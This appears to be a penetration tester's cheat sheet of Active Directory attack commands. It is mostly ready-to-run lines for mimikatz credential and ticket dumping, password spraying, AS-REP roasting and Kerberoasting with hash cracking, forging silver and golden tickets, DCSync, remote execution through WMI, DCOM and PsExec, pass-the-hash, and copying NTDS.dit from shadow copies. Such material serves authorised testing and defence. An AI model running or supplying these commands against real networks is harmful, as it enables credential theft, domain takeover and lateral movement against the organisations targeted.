
#### Cached AD Credentials

look for cache credentials and tickets of users who logged in in the past

tools: 
- mimikatz
```
privilege::debug

sekurlsa::logonpasswords - to dump all hashes
lsadump::sam - dump lsass and get NTLM hashes
sekurlsa::tickets - dump tickets
lsadump::lsa /patch - dumps the LM and NT password hashes

token::elevate
lsadump::secrets
```

#### Password Attacks

pass spray on the domain with current credentials

tools:
- Spray-Passwords.ps1
```
.\Spray-Passwords.ps1 -Pass <pass> -Admin
```

- crackmapexec
```
crackmapexec smb <IP> -u users.txt -p <pass> -d <domain> --continue-on-success
```

- kerbrute_windows_amd64.exe
```
.\kerbrute_windows_amd64.exe passwordspray -d <domain> .\usernames.txt "PASS"
```

- PowerView
	- use ```Find-LocalAdminAccess``` to see if you are local admin on other computers

- netexec
```
nxc smb <IP> -u <username> -H <hash> -d <domain> --continue-on-success
```

- secretdump
```
impacket-secretdump <domain>/<user>:<password>@<ip>
```

#### AS-REP Roasting / target AS-REP Roasting

abuse disable _preauthentication_ to get the hash of the user 
or if we have _GenericWrite_ or _GenericAll_ permissions on another AD user account we can disable _preauthentication_ 

tools:
- rubeus
```
.\Rubeus.exe asreproast /format:hashcat /nowrap
```

- impacket-GetNPUsers
```
impacket-GetNPUsers -dc-ip <DC IP> -request -outputfile hashes.asreproast <domain/user_name(to authenticate to DC)>

# without password
GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt

nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC
```

- PowerView
**AS-REP Roasting:** check if _Do not require Kerberos preauthentication_ enabled 
using powerview on windows:
```
Get-DomainUser -PreauthNotRequired
```

crack with hashcat:
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O
```
#### Kerberoasting / traget Kerberoasting

When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

by getting the TGS that encrypt by the SPN's hash password we can crack it

or if we have _GenericWrite_ or _GenericAll_ permissions on another AD user account we can set an SPN for the user

tools:
- rubeus - on windows
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

- impacket-GetUserSPNs
```
proxychains -q impacket-GetUserSPNs -request -dc-ip <IP> <domain/user(to authenticate to DC)>

sudo impacket-GetUserSPNs -request -dc-ip <DC IP> <domain>/<user_name(to authenticate to DC)>
```

crack hash
```
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt  -r /usr/share/hashcat/rules/best64.rule --force -O
```

#### Silver Tickets

need three things:
- SPN password hash
- Domain SID - can get by running `Get-ADdomain`
- Target SPN - `Get-ADUser -Filter {SamAccountName -eq "<spn_username>"} -Properties ServicePrincipalNames`

if we have that we can create a ticket with high privilege because the service don't validate our privilege with the DC

tools:
- mimikatz

```
kerberos::golden /sid:<domain SID> /domain:<domain> /ptt /target:<target> /service:<protocol> /rc4:<NTLM hash> /user:<user>
```

example:
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:domain.com /ptt /target:machine.domain.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin
```

- impacket
```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain domain.com -spn hostname/machine.domain.com -user-id 500 Administrator
```

export the ticket
```
export KRB5CCNAME=$PWD/Administrator.ccache
```
#### DCSYNC

To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned.

If we obtain access to a user account in one of these groups or with these rights assigned, we can impersonate a domain controller. This allows us to request any user credentials from the domain.

we can get the hash of users of all the domain

tools:
- mimikatz
```
lsadump::dcsync /user:<domain/user>
```

- impacket-secretsdump
```
secretsdump.py -just-dc <domain/login_user:login_pass>@<ip> -outputfile dcsync_hashes
```

#### Golden Ticket

if we get krbtgt hash we can create any ticket we want 
need two things:
- kirbi password hash
- Domain SID

tools:
- mimikatz
```
kerberos::golden /user:<target_user> /domain:<domain> /sid:<domain SID> /krbtgt:<kirbi hash> /ptt
```

#### WMI, WinRM DCOM

run process on a remote machine

tools:
- wmic
```
wmic /node:<IP> /user:<user> /password:<pass> process call create "<exe>"
```
- Invoke-CimMethod
- winrs
```
winrs -r:<host> -u:<user> -p:<pass>  "<command to run>"
```
- New-PSSession
- DCOM - ExecuteShellCommand
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target IP>"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<command>","7")
```



#### PsExec

run process on remote machine
can use to leverage to system
```
./PsExec64.exe -i  \\<host> -u <domain\user> -p <pass> <exe>
```

#### Pass the Hash

authenticate with the user hash

tools:
- [_PsExec_](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/) from Metasploit
- [_Passing-the-hash toolkit_](https://github.com/byt3bl33d3r/pth-toolkit)
- [_Impacket_](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)
```
/usr/bin/impacket-wmiexec -hashes :<ntkm hash> <user>@<IP>
```

- smbclient connect to smb share
```
smbclient \\\\<IP>\\<folder> -U <user> --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

- authenticate to a machine
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b <user>@<IP>
```
#### Overpass the Hash

when we need to authenticate via kerberos and we have only the hash of the user we can use it to create a ticket to the service we want and then authenticate with that 

tools: 
- mimikatz
```
sekurlsa::pth /user:<user> /domain:<domain>/ntlm:<ntlm hash> /run:<command>
```

#### Pass the Ticket

use the cached ticket and inject inside other sessions.

tools:
- mimikatz

```
privilege::debug
sekurlsa::tickets /export
dir *.kirbi

for example:
kerberos::ptt [0;12bd0]-0-0-40810000-admin@name.kirbi
```

#### Shadow Copies

dump ntds and then revers it to get all users' hash passwords

```
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```